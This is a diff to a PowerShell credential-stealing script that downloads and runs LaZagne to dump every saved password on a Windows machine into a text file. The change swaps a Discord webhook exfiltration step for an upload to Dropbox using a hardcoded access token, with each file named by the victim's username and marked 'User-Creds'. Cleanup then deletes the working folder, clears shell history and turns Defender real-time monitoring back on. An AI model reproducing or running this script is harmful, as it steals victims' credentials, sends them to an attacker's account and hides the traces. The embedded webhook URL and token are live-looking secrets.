@@ -82,25 +82,23 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 & "$dir\lazagne.exe" all > "$dir\output.txt"
 
 #Exfil
-$webhookUrl = "https://discord.com/api/webhooks/1249976768627085332/Xl5YJbv0fAS6pM_G0syZtcXjGtbZx59fDyMpl5RwR9xz-OchCdTtl_oMjkJlD7xp7NvH"
-$fileContent = Get-Content -Path "$dir\output.txt" -Raw
-$JsonBody = @"
-{
-    "embeds": [
-        {
-            "title": "Exfiltration successful :3",
-            "description": "$($fileContent -replace '(["\\])', '\\$1')"
-        }
-    ]
+#Token
+$dropboxAccessToken = "sl.B8KhQSNeWnyCzotjrNQJXFJN00APJyRDbGoCb3ogxDMHgpNJy6hVd4AImSiVDtugFJpQ2y46_5ojvmIdHqRiw_VYdH4_ZR0ZTWJUv2fEePSLK6MS29sYWaglJo1TgEFz-wcgPxY64Q8-"
+$filePath = "$dir\output.txt"
+$fileContent = Get-Content -Path $filePath -Raw
+$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+$dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"
+$headers = @{
+    "Authorization" = "Bearer $dropboxAccessToken"
+    "Content-Type" = "application/octet-stream"
+    "Dropbox-API-Arg" = '{"path":"/' + $fileName + '","mode":"overwrite","autorename":true,"mute":false}'
 }
-"@
-Write-Output $JsonBody
-Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $JsonBody -ContentType "application/json"
-
+Invoke-RestMethod -Uri $dropboxUploadUrl -Method POST -Headers $headers -Body $fileContent
 
 # Clean up
 Remove-Item -Path $dir -Recurse -Force
 Clear-History
+Set-MpPreference -DisableRealtimeMonitoring $false
 
 # Reboot the system
 #Restart-Computer -Force
